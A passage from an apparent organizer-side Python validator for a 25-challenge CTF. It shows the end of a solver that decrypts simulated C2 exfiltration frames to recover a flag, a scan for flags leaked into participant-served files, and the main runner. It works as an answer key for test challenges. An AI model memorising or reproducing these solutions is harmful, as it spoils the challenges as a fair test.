        if dport != port:
            continue
        live = [f for f in _m08_frames(blob)
                if f[0] != 0x00 and hmac.compare_digest(_m08_frame_mac(sid, f[5], f[3]), f[4])]
        live.sort(key=lambda f: f[1])
        prev, seen = sid, set()
        for _ftype, seq, nonce, ct, tag, _hv in live:
            if seq in seen:
                continue
            seen.add(seq)
            pts.append(bytes(a ^ b for a, b in zip(ct, _m08_ks(prev, nonce, seq, len(ct)))))
            prev = tag
    m = re.search(rb"FTA\{[a-z0-9_]+\}", b"".join(pts))
    assert m, "no flag in the C2 exfil payload"
    return m.group(0).decode()


def solve_m08():
    flag = _m08_recover()
    _record("M08", flag, "HMAC-gated chained C2 frames -> exfil payload")


# ---------------------------------------------------------------------------
# hygiene: file inventory, leak scan, points
# ---------------------------------------------------------------------------
def hygiene():
    assert len(MAN) == 25 and len(set(FL.values())) == 25
    assert sum(c["points"] for c in MAN) == 2200
    tiers = {"EASY": 0, "MEDIUM": 0, "HARD": 0}
    for c in MAN:
        t = c["directory"].split("/")[1]
        tiers[t] += 1
        d = ROOT / c["directory"]
        assert (d / "MISSION.md").is_file(), f"{c['id']}: missing MISSION.md"
        assert (d / "MISSION.md").read_text(encoding="utf-8") == c["description"]
        for fn in c["files"]:
            fp = d / fn
            assert fp.is_file() and fp.stat().st_size > 0, f"{c['id']}: bad file {fn}"
    assert tiers == {"EASY": 12, "MEDIUM": 8, "HARD": 5}, tiers

    # no canonical flag may appear verbatim in ANY participant-served tree
    roots = [ROOT / "challenges", ROOT / "frontend" / "public", ROOT / "frontend" / "dist",
             ROOT / "frontend" / "src"]
    leaks = []
    for base in roots:
        if not base.exists():
            continue
        for f in base.rglob("*"):
            if f.is_file() and f.suffix.lower() not in (".pdf",):
                try:
                    blob = f.read_bytes()
                except OSError:
                    continue
                for fl in FL.values():
                    if fl.encode() in blob:
                        leaks.append(str(f.relative_to(ROOT)))
    # binary artifacts (ELF/PNG/img/pcap/enc) are also scanned above; only the
    # readable text/doc trees matter but scanning all is stricter.
    assert not leaks, f"plaintext flag leak(s): {leaks}"
    print(f"+ hygiene OK: 25 challenges, 2,200 pts, 12/8/5 tiers, no flag leak "
          f"across {len(roots)} participant trees")


def main():
    print("=" * 68)
    print(" FLAG THEFT AUTO // BLACK-BOX VALIDATOR (25 rebuilt challenges)")
    print("=" * 68)
    solvers = [solve_e01, solve_e02, solve_e03, solve_e04, solve_e05,
               solve_e06, solve_e07, solve_e08, solve_e09, solve_e10,
               solve_e11, solve_e12,
               solve_m01, solve_m02, solve_m03, solve_m04, solve_m05,
               solve_m06, solve_m07, solve_m08,
               solve_h01, solve_h02, solve_h03, solve_h04, solve_h05]
    fails = []
    for fn in solvers:
        try:
            fn()
        except Exception as ex:  # noqa: BLE001
            fails.append((fn.__name__, repr(ex)))
            print(f"FAIL {fn.__name__}: {ex!r}")
    hygiene()
    print("-" * 68)
    out = ROOT / "organizer_private" / "CTFD_IMPORT" / "validation_results.json"
    out.write_text(json.dumps({
        "challenge_count": 25,
        "all_pass": not fails,
        "file_integrity": "all participant attachments exist and are non-empty",
        "plaintext_leak_scan": "no canonical flag appears in any participant-served tree",
        "cases": RESULTS,
        "failures": fails,
    }, indent=2) + "\n", encoding="utf-8")
    if fails:
        print(f">>> {len(fails)} VALIDATION FAILURE(S); see validation_results.json")
        sys.exit(1)
    print(">>> ALL 25 BLACK-BOX SOLVERS PASSED - 2,200 points, no leak <<<")


if __name__ == "__main__":
    main()
